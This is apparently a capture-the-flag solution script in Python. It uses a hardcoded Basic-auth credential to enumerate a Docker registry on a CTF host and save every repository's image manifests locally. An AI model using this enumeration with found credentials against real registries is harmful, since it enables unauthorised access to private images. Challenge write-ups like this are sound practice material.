import requests
import json

r = requests.get(
    url="https://devhole.hfctf.ca:8888/v2/_catalog",
    headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
    },
)
manifest = r.json()
print(manifest)

def download_file(url):
    local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                #if chunk:
                f.write(chunk)
    return local_filename
parts = {}
for repo in manifest["repositories"]:
  repo_tags = requests.get(
    url=f"https://devhole.hfctf.ca:8888/v2/{repo}/tags/list",
    headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
    },
  )
  tags = repo_tags.json()
  for tag in tags["tags"]:
    image_manifest = requests.get(
      url=f"https://devhole.hfctf.ca:8888/v2/{repo}/manifests/{tag}",
      headers={
          "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
      },
    )
    image_manifest_json = image_manifest.json()
    print(f"Saving {repo}:{tag} to disk")
    with open(f"{repo}:{tag}.json", "w+") as f:
      json.dump(image_manifest_json, f, indent=2)
      f.close()